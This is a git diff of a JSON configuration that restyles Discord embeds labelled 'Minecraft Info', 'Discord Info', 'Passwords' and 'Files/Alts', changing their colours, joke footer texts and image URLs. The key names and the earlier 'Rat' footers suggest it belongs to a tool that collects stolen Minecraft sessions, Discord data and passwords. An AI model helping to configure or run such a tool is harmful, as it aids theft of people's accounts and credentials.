@@ -8,27 +8,27 @@
   "ip_ratelimit": 6,
   "reset_ratelimit_after": 10,
 
-  "mc_embed_color": "FF031A",
+  "mc_embed_color": "9472C4",
   "mc_embed_title": "Minecraft Info",
-  "mc_embed_footer_text": "Rat",
-  "mc_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
+  "mc_embed_footer_text": "Zamn she's trans?",
+  "mc_embed_footer_icon": "https://i.ytimg.com/vi/bO4OiHMdNzU/maxresdefault.jpg",
 
 
-  "discord_embed_color": "0353FF",
+  "discord_embed_color": "9472C4",
   "discord_embed_title": "Discord Info",
-  "discord_embed_footer_text": "Rat",
-  "discord_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
+  "discord_embed_footer_text": "im too lazy to think abt this useless text",
+  "discord_embed_footer_icon": "https://i.ytimg.com/vi/bO4OiHMdNzU/maxresdefault.jpg",
 
 
-  "password_embed_color": "FFFF00",
+  "password_embed_color": "9472C4",
   "password_embed_title": "Passwords",
-  "password_embed_footer_text": "Rat",
-  "password_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
+  "password_embed_footer_text": "i can act rather silly at times",
+  "password_embed_footer_icon": "https://img2.uquiz.com/content/images/quiz_share_images/963757_1689494658_d28c8093-2265-4b8d-82aa-5fe295d50270.jpg",
 
-  "file_embed_color": "00FF00",
-  "file_embed_title": "Files",
-  "file_embed_footer_text": "Rat",
-  "file_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
+  "file_embed_color": "9472C4",
+  "file_embed_title": "Alts",
+  "file_embed_footer_text": "No alts?",
+  "file_embed_footer_icon": "https://i.ytimg.com/vi/7hWqOEoACig/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYAC0AWKAgwIABABGEkgUihlMA8=&rs=AOn4CLAwJ_o6CZ6i63wg4UFk5Kapn3cfUQ",
 
   "validate_session": false
 }
